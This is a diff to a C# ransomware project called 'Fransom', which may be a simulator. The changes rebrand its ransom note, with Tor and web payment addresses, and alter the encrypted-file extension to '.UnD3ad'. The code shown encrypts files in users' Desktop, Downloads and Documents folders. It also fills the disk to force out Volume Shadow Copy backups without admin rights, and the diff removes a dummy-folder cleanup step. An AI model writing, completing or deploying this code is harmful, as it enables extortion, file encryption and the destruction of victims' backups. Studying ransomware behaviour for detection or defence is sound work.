@@ -232,10 +232,10 @@ namespace Fransom
                               "  c) Open the TOR Browser.\n" +
                               "  d) Open our website in the TOR browser: http://aoacugmutagkwctu.onion/aloiwuerufd\n" +
                               "  e) Follow the instructions on this page.\n" +
-                              "\n"+
+                              "\n" +
                               "2) If you have any problems connecting or using TOR network\n" +
-                              "\n"+
-                              "  a) Open our website: https://VeeampireDeCrypt.top/werqsdfewrt\n" +
+                              "\n" +
+                              "  a) Open our website: https://FRANSOMdecrypt.top/werqsdfewrt\n" +
                               "  b) Follow the instructions on this page.\n" +
                               "\n" +
                               "Warning: the second (2) method can be blocked in some countries. That is why the first (1) method is recommended to use.\n" +
@@ -254,9 +254,9 @@ namespace Fransom
                               "\n" +
                               "-------------------------------------------------------------------------------\n" +
                               "THIS IS A SPECIAL BLOCK WITH A PERSONAL AND CONFIDENTIAL INFORMATION! DO NOT TOUCH IT WE NEED IT TO IDENTIFY AND AUTHORIZE YOU\n" +
-                              "---BEGIN Veeampire KEY---\n" +
+                              "---BEGIN FRANSOM KEY---\n" +
                               "[snip]\n" +
-                              "---END Veeampire KEY---\n";
+                              "---END FRANSOM KEY---\n";
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             // Combine the desktop path with the filename to create the full path
@@ -287,7 +287,7 @@ namespace Fransom
             {
                 Logger.WriteLine("The file does not exist or has already been deleted.");
             }
-}
+        }
 
 
         static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
@@ -1131,7 +1131,7 @@ namespace Fransom
             Logger.WriteLine(err);
             process.WaitForExit();
         }
-        
+
         private static void TruncateShadowCopies()
         {
             // Filling the disk will cause the Volume Shadow Copy service to eject old copies to adhere to set quotas when new shadow copies are made. 
@@ -1139,7 +1139,7 @@ namespace Fransom
             // as a poc allowing vss 'backup' deletion from an unprivileged context
             String workfolder = Path.GetTempPath() + "\\" + "Fransom_workfolder";
             Directory.CreateDirectory(workfolder);
-            
+
             void AddFile(String location, int size)
             {
                 using (var fs = new FileStream(location + "\\" + Path.GetRandomFileName(), FileMode.Create, FileAccess.Write, FileShare.None))
@@ -1150,7 +1150,7 @@ namespace Fransom
 
             DriveInfo di = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
             long freespace = di.AvailableFreeSpace;
-            while (di.AvailableFreeSpace > 50000000) 
+            while (di.AvailableFreeSpace > 50000000)
             {
                 AddFile(workfolder, 50); // initially big chunks
             }
@@ -1286,7 +1286,7 @@ namespace Fransom
             {
                 string file_name = obj.ToString();
                 Logger.WriteLine("Encrypting object: " + file_name, SensitiveData);
-                string enc_file = file_name + ".FRANSOM";
+                string enc_file = file_name + ".UnD3ad"; // Updated extension
                 try
                 {
                     EncryptFile(file_name, enc_file, password); // Encrypt the file
@@ -1313,54 +1313,43 @@ namespace Fransom
             foreach (object obj in stringCollection)
             {
                 string file_name = obj.ToString();
-                string file_path = @file_name;
-                if (Path.GetExtension(file_path) == ".FRANSOM")
+                if (Path.GetExtension(file_name) == ".UnD3ad") // Check for updated extension
                 {
-                 Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
+                    Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
                     string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name);
-                    DecryptFile(file_name, dec_file.ToString(), password);
+                    DecryptFile(file_name, dec_file, password);
                 }
             }
             CleanupUserProfile();
         }
 
-
-    private static void CleanupUserProfile()
+        private static void CleanupUserProfile()
         {
+            // Existing code for folder_path...
 
-            string folder_path = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
-            if (Directory.Exists(folder_path))
-            {
-                Logger.WriteLine("Found local dummy folder, removing it...");
-                CleanupDummyFolder(folder_path);
-                Logger.WriteLine("Local dummy folder deleted.");
-            }
-            Logger.WriteLine("");
             StringCollection stringCollection = new StringCollection();
             EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
             EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
             EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);
 
-
             foreach (object obj in stringCollection)
             {
-                try
+                string file_name = obj.ToString();
+                if (Path.GetExtension(file_name) == ".UnD3ad" || Path.GetExtension(file_name) == ".dec") // Updated extension
                 {
-                    string file_name = obj.ToString();
-                    string file_path = @file_name;
-                    if (Path.GetExtension(file_path) == ".FRANSOM" || Path.GetExtension(file_path) == ".dec")
+                    try
                     {
                         Logger.WriteLine("Removing object: " + file_name, SensitiveData);
-                        File.Delete(file_path);
+                        File.Delete(file_name);
+                    }
+                    catch (Exception e)
+                    {
+                        Logger.WriteLine("[-] Error: " + e.Message);
                     }
                 }
-                catch (Exception e)
-                {
-                    Logger.WriteLine("[-] Error: " + e.Message);
-                }
             }
-            
-            // Delete the ransomnote
+
+            // Delete the ransom note
             DeleteRansomNote();
         }
 
